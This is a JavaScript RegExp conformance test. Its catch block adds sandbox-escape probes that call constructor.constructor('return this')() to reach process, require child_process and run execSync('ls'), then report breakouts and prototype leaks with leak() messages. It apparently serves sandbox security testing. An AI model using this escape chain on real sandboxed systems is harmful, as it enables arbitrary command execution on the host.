try {
    var __pattern = /./i;
    var __re = new RegExp(__pattern);
    if (__re.source !== __pattern.source) {
        $ERROR('#1: __pattern = /./i; __re = new RegExp(__pattern); __re.source === __pattern.source. Actual: ' + __re.source);
    }
    if (__re.multiline !== __pattern.multiline) {
        $ERROR('#2: __pattern = /./i; __re = new RegExp(__pattern); __re.multiline === __pattern.multiline. Actual: ' + __re.multiline);
    }
    if (__re.global !== __pattern.global) {
        $ERROR('#3: __pattern = /./i; __re = new RegExp(__pattern); __re.global === __pattern.global. Actual: ' + __re.global);
    }
    if (__re.ignoreCase !== __pattern.ignoreCase) {
        $ERROR('#4: __pattern = /./i; __re = new RegExp(__pattern); __re.ignoreCase === __pattern.ignoreCase. Actual: ' + __re.ignoreCase);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}